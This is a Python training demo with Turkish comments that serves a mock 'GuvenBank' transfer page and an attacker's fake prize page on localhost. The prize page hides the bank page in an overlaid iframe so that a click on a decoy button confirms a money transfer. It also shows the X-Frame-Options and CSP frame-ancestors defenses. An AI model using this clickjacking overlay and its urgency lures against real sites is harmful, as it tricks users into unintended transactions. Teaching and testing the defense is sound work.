#!/usr/bin/env python3
"""
Clickjacking (UI Redressing) Egitim Demosu
==========================================
Iki ayri yerel sunucu calistirir:

  1) KURBAN SITE    -> http://localhost:8000   (GuvenBank - para transfer onay ekrani)
  2) SALDIRGAN SITE -> http://localhost:9090   (sahte cekilis sayfasi)

Saldirgan sayfa, kurban sayfayi tum ekrani kaplayan SEFFAF bir iframe icinde yukler.
Bankanin "Onayla ve Gonder" butonu, position:fixed ile sabit bir noktaya (ust:280px,
yatayda ortali) yerlestirilmistir. Saldirgan sayfadaki sahte "Hediyemi Al" butonu da
TAM AYNI noktaya konur. Boylece iki buton piksel piksel cakisir; kullanici sahte
butona tikladigini sanir, tiklamasi gercekte bankanin onay butonuna gider.

Demo sirasinda savunmayi canli ac/kapa:
  http://localhost:8000/toggle-defense
"""

import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Kurban sitenin cerceveleme savunmasi acik mi? /toggle-defense ile degisir.
DEFENSE_ENABLED = {"on": False}

# Iki sayfada da AYNI deger: butonun ekrandaki sabit konumu (piksel cakismasi icin).
BTN_TOP = 280
BTN_WIDTH = 440
BTN_HEIGHT = 62


# ==========================================================================
# KURBAN SITE (GuvenBank) - port 8000
# ==========================================================================
BANK_PAGE = f"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GuvenBank | Para Transferi</title>
<style>
  * {{ box-sizing:border-box; }}
  body {{ margin:0; font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
         background:#f1f4f9; color:#1f2d3d; }}
  .nav {{ background:#0b3d91; color:#fff; height:58px; display:flex; align-items:center;
         padding:0 28px; box-shadow:0 2px 6px rgba(0,0,0,.15); }}
  .nav .logo {{ font-size:20px; font-weight:700; letter-spacing:.3px; }}
  .nav .logo span {{ color:#7fb2ff; }}
  .nav .user {{ margin-left:auto; font-size:14px; opacity:0.45; }}

  .wrap {{ max-width:560px; margin:46px auto; padding:0 16px; }}
  .panel {{ background:#fff; border:1px solid #e4e9f2; border-radius:14px;
           box-shadow:0 6px 22px rgba(13,40,90,.08); overflow:hidden; }}
  .panel h1 {{ font-size:19px; margin:0; padding:20px 26px; border-bottom:1px solid #eef1f6; }}
  .body {{ padding:22px 26px 18px; }}
  .line {{ display:flex; justify-content:space-between; padding:13px 0;
          border-bottom:1px dashed #e9edf4; font-size:15px; }}
  .line:last-child {{ border-bottom:0; }}
  .line .k {{ color:#7a899e; }}
  .line .v {{ font-weight:600; }}
  .amount {{ color:#0b3d91; font-size:17px; }}
  .hint {{ font-size:13px; color:#90a0b6; margin:14px 2px 0; }}

  /* Hassas islem butonu: SABIT konum (saldirgan sayfayla cakistirmak icin) */
  .confirm {{ position:fixed; top:{BTN_TOP}px; left:50%; transform:translateX(-50%);
             width:{BTN_WIDTH}px; height:{BTN_HEIGHT}px; border:0; border-radius:11px;
             background:#16a34a; color:#fff; font-size:17px; font-weight:700;
             cursor:pointer; box-shadow:0 6px 16px rgba(22,163,74,.35);
             transition:background .15s; }}
  .confirm:hover {{ background:#13863c; }}

  #ok {{ position:fixed; top:{BTN_TOP + BTN_HEIGHT + 14}px; left:50%;
        transform:translateX(-50%); width:{BTN_WIDTH}px; display:none;
        background:#e7f7ec; color:#0f7a35; border:1px solid #bfe6cb;
        padding:13px 16px; border-radius:10px; font-weight:600; font-size:14px;
        text-align:center; }}
</style>
</head>
<body>
  <div class="nav">
    <div class="logo">Guven<span>Bank</span></div>
    <div class="user">Ahmet Yilmaz &nbsp;&#9679;&nbsp; Cikis</div>
  </div>

  <div class="wrap">
    <div class="panel">
      <h1>Para Transferi - Onay</h1>
      <div class="body">
        <div class="line"><span class="k">Gonderen</span><span class="v">TR12 0001 ... 4567</span></div>
        <div class="line"><span class="k">Alici</span><span class="v">Mehmet Demir</span></div>
        <div class="line"><span class="k">Alici IBAN</span><span class="v">TR98 0009 ... 8842</span></div>
        <div class="line"><span class="k">Aciklama</span><span class="v">Odeme</span></div>
        <div class="line"><span class="k">Tutar</span><span class="v amount">1.000,00 TL</span></div>
        <p class="hint">Islemi tamamlamak icin asagidaki butonu onaylayin.</p>
      </div>
    </div>
  </div>

  <button class="confirm" onclick="send()">Onayla ve Gonder</button>
  <div id="ok">Transfer basarili &mdash; 1.000,00 TL Mehmet Demir hesabina gonderildi.</div>

  <script>
    function send() {{
      document.getElementById('ok').style.display = 'block';
      console.log('[KURBAN] Transfer islemi gerceklesti.');
    }}
  </script>
</body>
</html>
"""

# ==========================================================================
# SALDIRGAN SITE (sahte cekilis) - port 9090
# ==========================================================================
ATTACKER_PAGE = f"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Yilin Buyuk Cekilisi - Hediyeni Al</title>
<style>
  * {{ box-sizing:border-box; }}
  body {{ margin:0; font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
         min-height:100vh; color:#fff; text-align:center;
         background:linear-gradient(160deg,#6d28d9 0%,#9333ea 45%,#db2777 100%); }}
  .badge {{ display:inline-block; margin-top:46px; padding:7px 16px; border-radius:999px;
           background:rgba(255,255,255,.18); font-size:13px; letter-spacing:.5px; }}
  h1 {{ font-size:40px; margin:18px 12px 6px; text-shadow:0 2px 10px rgba(0,0,0,.25); }}
  .sub {{ font-size:18px; opacity:.95; margin:0 12px; }}
  .prize {{ font-size:22px; font-weight:700; margin:10px 0 0; }}

  /* Butonun oturacagi alan icin bosluk birakir (buton position:fixed) */
  .slot {{ height:{BTN_HEIGHT + 26}px; }}

  /* Kullanicinin gordugu SAHTE buton: sabit konum, banka butonuyla AYNI yer */
  .cta {{ position:fixed; top:{BTN_TOP}px; left:50%; transform:translateX(-50%);
         width:{BTN_WIDTH}px; height:{BTN_HEIGHT}px; border:0; border-radius:11px;
         background:#facc15; color:#7c2d12; font-size:18px; font-weight:800;
         box-shadow:0 8px 22px rgba(0,0,0,.28); z-index:1; cursor:pointer; }}

  /* Kurban site: tum ekrani kaplayan SEFFAF iframe. Tiklamalar buraya gider. */
  .overlay {{ position:fixed; inset:0; width:100vw; height:100vh; border:0;
             z-index:2;            /* CTA'nin USTUNDE -> tiklamayi yakalar */
             opacity:0.45;            /* Hizalamayi gostermek icin 0.45 yap */ }}

  .timer {{ margin-top:8px; font-size:14px; opacity:.9; }}
  .timer b {{ background:rgba(0,0,0,.25); padding:3px 9px; border-radius:6px; }}
  .stars {{ margin-top:20px; font-size:13px; opacity:.85; }}
  .foot {{ margin:34px 12px 40px; font-size:12px; opacity:.7; }}
</style>
</head>
<body>
  <div class="badge">&#10003; DOGRULANMIS KAMPANYA</div>
  <h1>Tebrikler, kazandiniz!</h1>
  <p class="sub">Bugunku sansli ziyaretcilerimiz arasina girdiniz.</p>
  <p class="prize">&#127873; 100$ degerinde hediye karti</p>

  <div class="slot"></div>

  <p class="timer">Teklifin gecerlilik suresi: <b id="t">04:58</b></p>
  <p class="stars">&#9733;&#9733;&#9733;&#9733;&#9733; 2.418 kullanici hediyesini aldi</p>
  <p class="foot">Kampanya kosullari ve gizlilik politikasi gecerlidir.</p>

  <!-- Kullanicinin gordugu sahte buton -->
  <button class="cta">Hediyemi Al &#8594;</button>

  <!-- Gizli kurban -->
  <iframe class="overlay" src="http://localhost:8000/"></iframe>

  <script>
    // Aciliyet hissi veren sahte geri sayim (saldirilarda sik kullanilir).
    let s = 298;
    setInterval(() => {{
      s = Math.max(0, s - 1);
      const m = String(Math.floor(s/60)).padStart(2,'0');
      const ss = String(s%60).padStart(2,'0');
      document.getElementById('t').textContent = m + ':' + ss;
    }}, 1000);
  </script>
</body>
</html>
"""


class BankHandler(BaseHTTPRequestHandler):
    """Kurban site: 8000."""

    def _send_html(self, html, with_defense):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        if with_defense:
            # --- SAVUNMALAR ---
            self.send_header("X-Frame-Options", "DENY")               # eski tarayicilar
            self.send_header("Content-Security-Policy",               # modern karsilik
                             "frame-ancestors 'self'")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path.startswith("/toggle-defense"):
            DEFENSE_ENABLED["on"] = not DEFENSE_ENABLED["on"]
            state = "ACIK" if DEFENSE_ENABLED["on"] else "KAPALI"
            msg = (
                "<html><head><meta charset='utf-8'></head>"
                "<body style='font-family:Arial;text-align:center;margin-top:70px'>"
                f"<h2>Cerceveleme savunmasi: {state}</h2>"
                "<p><a href='http://localhost:9090/'>Saldirgan sayfayi yeniden dene &rarr;</a></p>"
                "</body></html>"
            ).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(msg)))
            self.end_headers()
            self.wfile.write(msg)
            return
        self._send_html(BANK_PAGE, with_defense=DEFENSE_ENABLED["on"])

    def log_message(self, fmt, *args):
        print("[KURBAN:8000]", fmt % args)


class AttackerHandler(BaseHTTPRequestHandler):
    """Saldirgan site: 9090."""

    def do_GET(self):
        body = ATTACKER_PAGE.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        print("[SALDIRGAN:9090]", fmt % args)


def serve(port, handler):
    ThreadingHTTPServer(("localhost", port), handler).serve_forever()


if __name__ == "__main__":
    print("=" * 60)
    print(" Clickjacking Egitim Demosu calisiyor")
    print("-" * 60)
    print(" Kurban  (banka)   : http://localhost:8000/")
    print(" Saldirgan (tuzak) : http://localhost:9090/   <-- BUNU AC")
    print(" Savunmayi ac/kapa : http://localhost:8000/toggle-defense")
    print("=" * 60)
    threading.Thread(target=serve, args=(8000, BankHandler), daemon=True).start()
    serve(9090, AttackerHandler)
